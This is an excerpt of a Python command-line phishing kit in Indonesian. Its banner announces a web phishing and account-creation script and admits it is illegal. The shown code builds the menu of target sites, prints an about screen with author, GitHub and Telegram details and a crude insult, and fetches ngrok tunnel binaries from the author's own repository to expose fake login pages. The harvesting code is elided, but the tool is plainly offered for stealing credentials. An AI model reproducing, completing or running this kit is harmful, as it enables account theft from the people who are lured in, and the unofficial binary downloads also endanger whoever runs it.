...
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃               SCRIPT WEB PHISING / CREATE AKUN                    ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  WARNING!!!! SCRIPT INI ILEGAL SEGALA AKTIVITAS TANGGUNG SENDIRI  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                      
{cyan}┏━━━━━━━━━━━━━━━━━━━┓
┃ VERSION  {version}      ┃
┗━━━━━━━━━━━━━━━━━━━┛
...
def show_options(sites):
    ...
    def optioner(index, max_len):
        ...
        return f"{hijaulumut}┃[{white}{new_index}{hijaulumut}] ┃{cyan}{sites[index]}{space}"
    ...
    if isfile(saved_file) and cat(saved_file)!="":
        options += f"{green}[{white}a{green}]{hijaulumut} About      {green}[{white}s{green}]{hijaulumut} Saved      {green}[{white}x{green}]{hijaulumut} More Tools      {green}[{white}0{green}]{hijaulumut} Exit\n\n"
    else:
        options += f"{green}[{white}a{green}]{hijaulumut} About                   {green}[{white}m{green}]{hijaulumut} Main Menu         {green}[{white}0{green}]{hijaulumut} Exit\n\n"
    lolcat(options)
...
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green} PHISHING WEB {yellow}] ")
    print(f"{red}{yellow}[{purple} Status {yellow}]      {cyan} : {yellow}[{green}AKTIF{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}MR BABYBOT{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/BABYBOTCHANNELS{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}GROUP TELE{yellow}]    {cyan} : {yellow}[{green}https://t.me/BABYBOT_CHANNEL{yellow}] ")
    print(f"{red}{yellow}[{purple} NOTICE {yellow}]      {cyan} : {yellow}[{green} KONTOL BAPA KAU PECAH {yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
...
def requirements():
    ...
    if "linux" in platform:
        if "arm64" in architecture or "aarch64" in architecture:
            if not isngrok:
                download("https://github.com/BABYBOTCHANNELS/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
            ...
            if not isngrok:
                download("https://github.com/BABYBOTCHANNELS/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
            if not iscloudflared:
            ...
            if not isngrok:
                download("https://github.com/BABYBOTCHANNELS/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
            if not iscloudflared:
            ...
            if not isngrok:
                download("https://github.com/BABYBOTCHANNELS/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
            if not iscloudflared:
        ...
        if "x86_64" in architecture or "amd64" in architecture:
            if not isngrok:
                download("https://github.com/BABYBOTCHANNELS/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
            ...
            if not isngrok:
                download("https://github.com/BABYBOTCHANNELS/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
                extract("ngrok.zip", f"{tunneler_dir}")
                remove("ngrok.zip")
            if not iscloudflared:
